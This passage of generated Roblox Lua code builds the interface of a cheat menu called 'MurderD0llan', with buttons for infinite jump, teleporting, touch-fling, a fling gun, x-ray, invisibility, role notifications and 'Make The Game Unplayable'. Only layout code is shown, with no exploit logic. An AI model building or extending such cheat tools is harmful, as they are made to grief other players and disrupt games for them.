G2L["2c"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.nolip.Frame
G2L["2d"] = Instance.new("Frame", G2L["2c"]);
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["2d"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.nolip.UIGradient
G2L["2e"] = Instance.new("UIGradient", G2L["2c"]);
G2L["2e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.infinitejump
G2L["2f"] = Instance.new("TextButton", G2L["b"]);
G2L["2f"]["TextWrapped"] = true;
G2L["2f"]["TextStrokeTransparency"] = 0;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["TextSize"] = 20;
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2f"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["2f"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["2f"]["Name"] = [[infinitejump]];
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Text"] = [[Infinite Jump  ]];
G2L["2f"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.2149122804403305, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.infinitejump.Frame
G2L["30"] = Instance.new("Frame", G2L["2f"]);
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["30"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.infinitejump.UIGradient
G2L["31"] = Instance.new("UIGradient", G2L["2f"]);
G2L["31"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.teleporttool
G2L["32"] = Instance.new("TextButton", G2L["b"]);
G2L["32"]["TextWrapped"] = true;
G2L["32"]["TextStrokeTransparency"] = 0;
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["TextSize"] = 20;
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["32"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["32"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["32"]["Name"] = [[teleporttool]];
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Text"] = [[   always Give TP-Tool  ]];
G2L["32"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.teleporttool.Frame
G2L["33"] = Instance.new("Frame", G2L["32"]);
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["33"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.teleporttool.UIGradient
G2L["34"] = Instance.new("UIGradient", G2L["32"]);
G2L["34"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.spin
G2L["35"] = Instance.new("TextButton", G2L["b"]);
G2L["35"]["TextWrapped"] = true;
G2L["35"]["TextStrokeTransparency"] = 0;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["TextSize"] = 20;
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["35"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["35"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["35"]["Name"] = [[spin]];
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Spin  ]];
G2L["35"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);
-- Attributes
G2L["35"]:SetAttribute([[DoubleClick]], [[]]);
G2L["35"]:SetAttribute([[Debug_Text]], [[Esp - Disabled]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.spin.Frame
G2L["36"] = Instance.new("Frame", G2L["35"]);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["36"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.spin.UIGradient
G2L["37"] = Instance.new("UIGradient", G2L["35"]);
G2L["37"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.touchfling
G2L["38"] = Instance.new("TextButton", G2L["b"]);
G2L["38"]["TextWrapped"] = true;
G2L["38"]["TextStrokeTransparency"] = 0;
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["TextSize"] = 20;
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["38"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["38"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["38"]["Name"] = [[touchfling]];
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Text"] = [[Touch-Fling  ]];
G2L["38"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.touchfling.Frame
G2L["39"] = Instance.new("Frame", G2L["38"]);
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["39"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.touchfling.UIGradient
G2L["3a"] = Instance.new("UIGradient", G2L["38"]);
G2L["3a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextLabel
G2L["3b"] = Instance.new("TextLabel", G2L["b"]);
G2L["3b"]["TextWrapped"] = true;
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["TextSize"] = 16;
G2L["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.OnNewMurderAndSherrif
G2L["3c"] = Instance.new("TextButton", G2L["b"]);
G2L["3c"]["TextWrapped"] = true;
G2L["3c"]["TextStrokeTransparency"] = 0;
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["TextSize"] = 20;
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3c"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["3c"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["3c"]["Name"] = [[OnNewMurderAndSherrif]];
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Text"] = [[Notify New Murder / Sherrif  ]];
G2L["3c"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.OnNewMurderAndSherrif.Frame
G2L["3d"] = Instance.new("Frame", G2L["3c"]);
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["3d"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.OnNewMurderAndSherrif.UIGradient
G2L["3e"] = Instance.new("UIGradient", G2L["3c"]);
G2L["3e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.OnNewTrapsAndGunDrops
G2L["3f"] = Instance.new("TextButton", G2L["b"]);
G2L["3f"]["TextWrapped"] = true;
G2L["3f"]["TextStrokeTransparency"] = 0;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["TextSize"] = 20;
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3f"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["3f"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["3f"]["Name"] = [[OnNewTrapsAndGunDrops]];
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Text"] = [[Notify Traps And Gun-Drops  ]];
G2L["3f"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.4231128394603729, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.OnNewTrapsAndGunDrops.Frame
G2L["40"] = Instance.new("Frame", G2L["3f"]);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["40"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.OnNewTrapsAndGunDrops.UIGradient
G2L["41"] = Instance.new("UIGradient", G2L["3f"]);
G2L["41"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextLabel
G2L["42"] = Instance.new("TextLabel", G2L["b"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["TextSize"] = 16;
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["42"]["BackgroundTransparency"] = 1;
G2L["42"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.HideYourName
G2L["43"] = Instance.new("TextButton", G2L["b"]);
G2L["43"]["TextWrapped"] = true;
G2L["43"]["TextStrokeTransparency"] = 0;
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["TextSize"] = 20;
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["43"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["43"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["43"]["Name"] = [[HideYourName]];
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Text"] = [[Hide Your Name (client-sided)  ]];
G2L["43"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.HideYourName.UIGradient
G2L["44"] = Instance.new("UIGradient", G2L["43"]);
G2L["44"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TP2Map
G2L["45"] = Instance.new("TextButton", G2L["b"]);
G2L["45"]["TextWrapped"] = true;
G2L["45"]["TextStrokeTransparency"] = 0;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["TextSize"] = 20;
G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["45"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["45"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["45"]["Name"] = [[TP2Map]];
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Text"] = [[Teleport To Map  ]];
G2L["45"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TP2Map.UIGradient
G2L["46"] = Instance.new("UIGradient", G2L["45"]);
G2L["46"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TP2Lobby
G2L["47"] = Instance.new("TextButton", G2L["b"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["TextStrokeTransparency"] = 0;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["TextSize"] = 20;
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["47"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["47"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["47"]["Name"] = [[TP2Lobby]];
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[Teleport To Lobby  ]];
G2L["47"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TP2Lobby.UIGradient
G2L["48"] = Instance.new("UIGradient", G2L["47"]);
G2L["48"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextLabel
G2L["49"] = Instance.new("TextLabel", G2L["b"]);
G2L["49"]["TextWrapped"] = true;
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["TextSize"] = 16;
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["49"]["BackgroundTransparency"] = 1;
G2L["49"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1SS
G2L["4a"] = Instance.new("TextButton", G2L["b"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["TextStrokeTransparency"] = 0;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["TextSize"] = 20;
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4a"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["4a"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["4a"]["Name"] = [[TextBoxButton1SS]];
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[ stretch screen (0 to 1)]];
G2L["4a"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.8508771657943726, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1SS.UIGradient
G2L["4b"] = Instance.new("UIGradient", G2L["4a"]);
G2L["4b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.TextBoxButton1SS.TextBox
G2L["4c"] = Instance.new("TextBox", G2L["4a"]);
G2L["4c"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["4c"]["TextSize"] = 14;
G2L["4c"]["TextWrapped"] = true;
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c"]["PlaceholderText"] = [[enter...]];
G2L["4c"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["Text"] = [[]];
G2L["4c"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.xray
G2L["4d"] = Instance.new("TextButton", G2L["b"]);
G2L["4d"]["TextWrapped"] = true;
G2L["4d"]["TextStrokeTransparency"] = 0;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["TextSize"] = 20;
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4d"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["4d"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["4d"]["Name"] = [[xray]];
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[X-RAY  ]];
G2L["4d"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.xray.Frame
G2L["4e"] = Instance.new("Frame", G2L["4d"]);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["4e"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.xray.UIGradient
G2L["4f"] = Instance.new("UIGradient", G2L["4d"]);
G2L["4f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.invisible
G2L["50"] = Instance.new("TextButton", G2L["b"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["TextStrokeTransparency"] = 0;
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["TextSize"] = 24;
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["50"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["50"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["50"]["Name"] = [[invisible]];
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[Invisible  ]];
G2L["50"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.invisible.Frame
G2L["51"] = Instance.new("Frame", G2L["50"]);
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["51"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.invisible.UIGradient
G2L["52"] = Instance.new("UIGradient", G2L["50"]);
G2L["52"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.FlingGun
G2L["53"] = Instance.new("TextButton", G2L["b"]);
G2L["53"]["TextWrapped"] = true;
G2L["53"]["TextStrokeTransparency"] = 0;
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["TextSize"] = 24;
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["53"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["53"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["53"]["Name"] = [[FlingGun]];
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Text"] = [[Fling-Gun [CLIENT-SIDE]  ]];
G2L["53"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.FlingGun.Frame
G2L["54"] = Instance.new("Frame", G2L["53"]);
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["54"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.FlingGun.UIGradient
G2L["55"] = Instance.new("UIGradient", G2L["53"]);
G2L["55"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.RespawnOnDeathPosition
G2L["56"] = Instance.new("TextButton", G2L["b"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["TextStrokeTransparency"] = 0;
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["TextSize"] = 21;
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["56"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["56"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["56"]["Name"] = [[RespawnOnDeathPosition]];
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[Respawn On Death Position  ]];
G2L["56"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.RespawnOnDeathPosition.Frame
G2L["57"] = Instance.new("Frame", G2L["56"]);
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["57"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.RespawnOnDeathPosition.UIGradient
G2L["58"] = Instance.new("UIGradient", G2L["56"]);
G2L["58"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.MakeTheGameUnplayable
G2L["59"] = Instance.new("TextButton", G2L["b"]);
G2L["59"]["TextWrapped"] = true;
G2L["59"]["TextStrokeTransparency"] = 0;
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["TextSize"] = 21;
